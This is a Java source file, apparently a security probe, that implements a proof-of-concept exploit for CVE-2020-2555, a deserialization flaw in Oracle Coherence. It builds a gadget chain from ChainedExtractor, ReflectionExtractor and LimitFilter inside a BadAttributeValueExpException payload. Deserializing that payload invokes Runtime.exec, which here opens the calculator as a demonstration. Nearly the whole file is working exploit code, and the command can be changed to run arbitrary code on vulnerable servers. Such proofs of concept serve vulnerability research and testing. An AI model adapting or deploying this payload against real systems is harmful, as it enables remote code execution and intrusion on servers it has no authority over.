package probes;

import burp.Utilities;
import com.sun.net.httpserver.Filter;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;

// ref: https://paper.seebug.org/1141/
public class CVE_2020_2555 {
    public static void main(String[] args) throws Exception {
        MvelExtractor gadget1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\")");
        ChainedExtractor gadget2 = new ChainedExtractor(
                new ValueExtractor[]{
                        new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                        new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                        new ReflectionExtractor("exec", new String[]{"open /System/Applications/Calculator.app"})
                }
        );

        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
        LimitFilter filter = new LimitFilter();
        filter.setComparator(gadget2);
        filter.setTopAnchor(Runtime.class);
        Utilities.setFieldValue(payload, "val", filter);

        Utilities.deserialize(Utilities.serialize(payload));
    }
}
